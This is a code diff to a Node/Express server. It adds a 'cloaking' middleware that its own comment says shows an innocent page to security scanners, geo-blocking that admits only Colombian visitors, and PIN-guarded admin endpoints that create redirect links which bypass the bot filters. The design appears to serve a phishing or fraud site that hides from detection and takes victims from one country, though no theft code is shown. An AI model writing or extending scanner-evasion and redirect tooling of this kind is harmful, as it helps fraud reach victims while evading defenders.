@@ -16,6 +16,8 @@ import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getP
 import { sendTelegramMessage } from "../telegram";
 import { getAppConfig, setAppConfig } from "../db";
 import { securityMiddleware, robotsTxtHandler, botTrapHandler, requestFingerprint } from "../security";
+import { cloakingMiddleware, getScannerLog } from "../cloaking";
+import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirectLink, loadRedirectLinksFromDB } from "../redirector";
 import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
 import geoip from "geoip-lite";
 import { setRateLimitBannedIPs } from "./rateLimitStore";
@@ -78,10 +80,13 @@ async function startServer() {
     return securityEnabledCacheValue;
   }
 
+  // ─── CLOAKING: Show innocent page to security scanners (runs BEFORE geo-blocking) ───
+  app.use(cloakingMiddleware);
+
   // ─── GEO-BLOCKING: Only allow Colombian IPs (always active) ─────────────
   app.use((req, res, next) => {
     // Skip only for admin API, oauth, trpc, telegram webhook, internal paths, and static assets
-    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/api/oauth") || req.path.startsWith("/api/telegram") || req.path.startsWith("/socket.io") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path === "/robots.txt" || req.path === "/favicon.ico") {
+    if (req.path.startsWith("/api/admin") || req.path.startsWith("/api/trpc") || req.path.startsWith("/api/oauth") || req.path.startsWith("/api/telegram") || req.path.startsWith("/socket.io") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/r/") || req.path === "/robots.txt" || req.path === "/favicon.ico") {
       return next();
     }
     const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
@@ -111,6 +116,8 @@ async function startServer() {
   // Security: block bots, crawlers, Google agents, and automation tools
   // Only active when security is ENABLED from the admin panel
   app.use(async (req, res, next) => {
+    // Skip redirect links - they handle their own bot detection
+    if (req.path.startsWith("/r/")) return next();
     const secEnabled = await isSecurityEnabled();
     if (secEnabled) {
       return securityMiddleware(req, res, next);
@@ -709,6 +716,50 @@ async function startServer() {
     }
   });
 
+  // ─── Redirect System Routes ────────────────────────────────────────────
+  app.get("/r/:id", serveRedirectPage);
+
+  // Admin: Get scanner detection log
+  app.get("/api/admin/scanner-log", async (req, res) => {
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) {
+      return res.status(401).json({ ok: false, error: "No autorizado" });
+    }
+    res.json({ ok: true, log: getScannerLog() });
+  });
+
+  // Admin: Create redirect link
+  app.post("/api/admin/redirect-links", async (req, res) => {
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) {
+      return res.status(401).json({ ok: false, error: "No autorizado" });
+    }
+    const { target } = req.body;
+    if (!target) return res.status(400).json({ ok: false, error: "Target URL required" });
+    const id = createRedirectLink(target);
+    const origin = `${req.protocol}://${req.get("host")}`;
+    res.json({ ok: true, id, url: `${origin}/r/${id}` });
+  });
+
+  // Admin: List redirect links
+  app.get("/api/admin/redirect-links", async (req, res) => {
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) {
+      return res.status(401).json({ ok: false, error: "No autorizado" });
+    }
+    res.json({ ok: true, links: getRedirectLinks() });
+  });
+
+  // Admin: Delete redirect link
+  app.delete("/api/admin/redirect-links/:id", async (req, res) => {
+    const pin = req.headers["x-admin-pin"] as string;
+    if (pin !== await getAdminPin()) {
+      return res.status(401).json({ ok: false, error: "No autorizado" });
+    }
+    const deleted = deleteRedirectLink(req.params.id);
+    res.json({ ok: deleted });
+  });
+
   // Check if IP is banned (public endpoint for frontend)
   app.get("/api/check-ip", async (req, res) => {
     const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
@@ -737,6 +788,9 @@ async function startServer() {
   if (port !== preferredPort) {
     console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
   }
+
+  // Load redirect links from DB
+  await loadRedirectLinksFromDB();
 
   server.listen(port, () => {
     console.log(`Server running on http://localhost:${port}/`);
